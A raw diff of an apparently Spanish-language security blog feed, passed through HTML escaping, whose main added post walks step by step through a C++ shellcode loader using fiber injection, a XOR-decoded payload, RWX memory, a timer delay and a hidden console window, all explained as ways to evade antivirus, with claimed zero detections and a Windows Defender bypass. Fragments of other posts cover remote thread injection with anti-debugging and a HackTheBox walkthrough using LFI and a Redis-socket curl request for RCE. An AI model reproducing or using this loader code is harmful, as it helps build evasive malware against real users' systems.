+	&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsigned int shellcode_len = sizeof(shellcode);&lt;/code&gt; le estamos diciendo que obtenga el tamaño total en bytes de la shellcode&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Despues necesitamos asignar memoria para nuestra shellcode, para esto usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+	    &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;El primer parametro de la direccion de memoria donde se va a asignar, y le puse NULL para que el sistema operativo lo haga, el segundo parametro es el tamaño en bytes que se van a asignar, y le pase la variable que tiene el tamaño, el tercero es el tipo de asignacion y le puse &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MEM_COMMIT&lt;/code&gt; para que inicialmente la asignacion contenga puros ceros, y el ultimo argumento son las protecciones de memoria que tendra esa asignacion, y le puse que tenga permisos de ejecucion, escritura, y lectura&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despues se copia la shellcode en la memoria que se asigno con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;A este punto ya tenemos la memoria lista para nuestra shellcode, ahora debemos de crear una fibra, para eso usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFiber&lt;/code&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPFIBER_START_ROUTINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo que esta haciendo es crear una fibra, donde la ejecucion de la fibra comienza desde la direccion que regresa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;, el primer parametro es el tamaño del stack de la fibra, le puse en 0 para que agarre el tamaño por defecto, el segundo parametro es la direccion inicial de la fibra, y observa que el segundo parametro se agrego de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(LPFIBER_START_ROUTINE)exec_mem&lt;/code&gt;, y lo que esta haciendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPFIBER_START_ROUTINE&lt;/code&gt; es definir un puntero como una rutina, que vendria siendo una funcion de callback a nuestra direccion de inicio de la fibra, la cual se encuentra en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec_mem&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despues de que creamos la fibra, debemos de cambiar de contexto y ejecutar la fibra, para eso usamos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;SwitchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El unico parametro que recibe es la direccion de la fibra, la cual se almacena en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_fiber&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Las ultima dos funciones solo son para eliminar la fibra despues de que se ejecute y liberar memoria&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Asi que todo lo que se encuentra dentro de la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fiber_injection&lt;/code&gt; es solamente para hacer una clasica inyeccion de fibras, a este punto ya se implemento la primera tecnica, y para que esa funcion se ejecute solo hay que llamarla asi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fiber_injection()&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;funcion-shellcode_routine-callback&quot;&gt;Funcion shellcode_routine (callback)&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Despues en el codigo tenemos una funcion callback, donde se implementa la segunda tecnica (timming attack), esta implementacion del callback vendria siendo una implementacio manual de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPFIBER_START_ROUTINE&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Lo que tenemos primero es un temporizador que agregara un delay de 20 segundos antes de ejecutar la fibra que contiene la shellcode:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timerId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SetTimer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HWND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hwnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uMsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fiber_injection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;witchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;KillTimer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;	
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro de los parametros de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetTimer&lt;/code&gt; le indicamos en milisegundos el tiempo que va a esperar para ejecutarse lo que se encuentre dentro, y en este caso es la llamada a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fiber_injection&lt;/code&gt;, esto es una clasica implementacion de un timming attack que agrega un pequeño delay al inicio de la ejecucion del malware para evadir los antivirus&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despues tenemos un pequeño buble declarado de esta forma:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;	
+    	&lt;span class=&quot;n&quot;&gt;TranslateMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    	&lt;span class=&quot;n&quot;&gt;DispatchMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Donde con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetMessage&lt;/code&gt; le estamos diciendo que se siga ejecutando hasta que reciba una señal de salida, esa señal de salida se manda a llamar desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TranslateMessage&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DispatchMessage&lt;/code&gt;, esto se usa por que debemos de procesar los mensajes, y con ayuda de esas funciones, la fibra esta respondiendo a los mensajes recibidos y manteniendo la ejecución en curso.&lt;/p&gt;
+
+&lt;p&gt;Asi que toda la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VOID CALLBACK shellcode_routine&lt;/code&gt; implementa una funcion de callback para hacer un timming attack en la fibra de la shellcode.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;funcion-main&quot;&gt;Funcion Main&lt;/h2&gt;
+
+&lt;p&gt;A este punto ya solo nos queda mandar a llamar a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;,&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Lo primero que tenemos en el main son dos funciones que lo que hacen es ocultar la ventana del cmd que se abre al ejecutar el binario:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HWND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ventana_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetConsoleWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ShowWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ventana_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SW_HIDE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despues se esta conviertiendo el hilo principal en una fibra:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_fiber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConvertThreadToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Esto con el fin de cambiar de contexto entre las fibras&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La funcion que sigue crea una fibra donde el segundo parametro es el callback creado anteriormente:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_routine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despues ejecuta la fibra creada anteriormente:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;witchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Y por ultimo ejecuta la fibra principal&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;SwitchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como te daras cuenta, se ejecutan 3 fibras&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La fibra principal&lt;/li&gt;
+  &lt;li&gt;La fibra de la shellcode que manda a llamar al callback &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_routine&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Y la fibra de la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fiber_injection&lt;/code&gt;, yo la llamo la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fibra comodin&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahora te preguntaras “¿Por que 3 fibras, si solo una es la que inyecta la shellcode?”, pues ahi te va la explicacion de por que las 3 fibras evaden los antivirus&lt;/p&gt;
+
+&lt;p&gt;Las 3 fibras se usan de la siguiente manera, cuando en el main se ejecuta la primera fibra que manda a llamar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_routine&lt;/code&gt;, lo que va a pasar es que entrara a la funcion callback y esperara 20 segundos para ejecutar la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fibra comodin&lt;/code&gt;, mientras que a su vez en el main se hace un llamado para ejectutar otra fibra, que es la fibra principal (main_fiber), y lo que estaria pasando es que la fibra que mando a llamar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_routine&lt;/code&gt; y la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_fiber&lt;/code&gt; se estarian ejecutandose en contextos diferentes, permitiendo que la ejecucion de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fibra comidin&lt;/code&gt; pase desapercibida por los antivirus ocultando su actividad e inyectando la shellcode, mientras que el programa sigue fluyendo normalmente ejecutandose en el hilo principal mediante la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_fiber&lt;/code&gt;, asi que los antivirus lo unico que estarian detectando es la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_fiber&lt;/code&gt; que no tiene un comportamiendo extraño, Genial, ¿No?.&lt;/p&gt;
+
+&lt;h4 id=&quot;resultados&quot;&gt;Resultados&lt;/h4&gt;
+
+&lt;p&gt;0/26 antiscan.me - Fecha: 15 de junio del 2023&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/bypassAV_fiber/antiscanme.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bypass Windows defender:&lt;/p&gt;
+
+&lt;video src=&quot;/assets/img/bypassAV_fiber/poc.mp4&quot; controls=&quot;controls&quot;&gt;&lt;/video&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/bypassAV_fiber/waifu.gif" /><media:content medium="image" url="/assets/img/bypassAV_fiber/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Inyeccion de procesos/codigo - shellcode via CreateRemoteThread + AntiDBG basico</title><link href="/blog/posts/2023-06-15-maldev-createRemoteThread/" rel="alternate" type="text/html" title="Inyeccion de procesos/codigo - shellcode via CreateRemoteThread + AntiDBG basico" /><published>2023-06-15T00:00:00-06:00</published><updated>2023-06-15T15:30:43-06:00</updated><id>/blog/posts/maldev-createRemoteThread</id><content type="html" xml:base="/blog/posts/2023-06-15-maldev-createRemoteThread/">&lt;p&gt;Que onda, esta vez que voy a enseñar a como puedes inyectar una shellcode en un proceso remoto usando CreateRemoteThread, o como tambien se le conoce “Remote Thread Injection”, ademas veremos una tecnica AntiDBG muy basica para evadir los depuradores&lt;/p&gt;
 
 &lt;h2 id=&quot;remote-thread-injection&quot;&gt;Remote Thread Injection&lt;/h2&gt;
 
@@ -267,7 +545,7 @@
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/remote_thread_injection/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/remote_thread_injection/waifu.gif" /><media:content medium="image" url="/assets/img/remote_thread_injection/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Format - LFI, Redis y Python format string</title><link href="/blog/posts/2023-06-12-htb-format/" rel="alternate" type="text/html" title="HackTheBox Format - LFI, Redis y Python format string" /><published>2023-06-12T00:00:00-06:00</published><updated>2023-06-13T18:23:59-06:00</updated><id>/blog/posts/htb-format</id><content type="html" xml:base="/blog/posts/2023-06-12-htb-format/">&lt;p&gt;Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde una configuracion incorrecta de un proxy mediante una expresion, nos permitira acceder a un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE&lt;/p&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/remote_thread_injection/waifu.gif" /><media:content medium="image" url="/assets/img/remote_thread_injection/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Format - LFI, Redis y Python format string</title><link href="/blog/posts/2023-06-12-htb-format/" rel="alternate" type="text/html" title="HackTheBox Format - LFI, Redis y Python format string" /><published>2023-06-12T00:00:00-06:00</published><updated>2023-06-14T22:38:46-06:00</updated><id>/blog/posts/htb-format</id><content type="html" xml:base="/blog/posts/2023-06-12-htb-format/">&lt;p&gt;Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE&lt;/p&gt;
 
 &lt;p&gt;Para la flag de user nos volveremos a conectar por el socket a redis, para filtrar la contraseña de SSH, y para la escalada explotaremos una vulnerabilidad format string en python&lt;/p&gt;
 
@@ -479,7 +757,7 @@
 
 &lt;p&gt;Esta conectandose a Redis para establecer una conexion a travez del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/redis/redis.sock&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;Despues basicamente si el usuario tiene la propiedad “pro” establecida como “true”, retorna “true”, y si no, se retornará la cadena “false”, y como tenemos un implementacion incorrecta en el proxy, entonces podemos acceder al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/redis/redis.sock&lt;/code&gt; para modificar los valores de la propiedad “pro”, par convertir nuestra cuenta de usuario en pro, y lo podemos hacer de esta manera:&lt;/p&gt;
+&lt;p&gt;Despues basicamente si el usuario tiene la propiedad “pro” establecida como “true”, retorna “true”, y si no, se retornará la cadena “false”, y como tenemos un implementacion incorrecta en el proxy, entonces podemos interactuar con el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/redis/redis.sock&lt;/code&gt; para modificar los valores de la propiedad “pro”, par convertir nuestra cuenta de usuario en pro, y lo podemos hacer de esta manera:&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -X HSET &quot;http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:carta%20pro%20true%20a/b&quot;&lt;/code&gt;&lt;/p&gt;
 
@@ -719,7 +997,7 @@
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/htb-format/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="LFI" /><category term="python format string" /><summary type="html">Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde una configuracion incorrecta de un proxy mediante una expresion, nos permitira acceder a un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/htb-format/waifu.gif" /><media:content medium="image" url="/assets/img/htb-format/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Inyeccion de shellcodes usando la syscall mmap</title><link href="/blog/posts/2023-06-10-inyeccion-shellcodes-mmap/" rel="alternate" type="text/html" title="Inyeccion de shellcodes usando la syscall mmap" /><published>2023-06-10T00:00:00-06:00</published><updated>2023-06-10T21:32:40-06:00</updated><id>/blog/posts/inyeccion-shellcodes-mmap</id><content type="html" xml:base="/blog/posts/2023-06-10-inyeccion-shellcodes-mmap/">&lt;h2 id=&quot;mmap&quot;&gt;mmap&lt;/h2&gt;
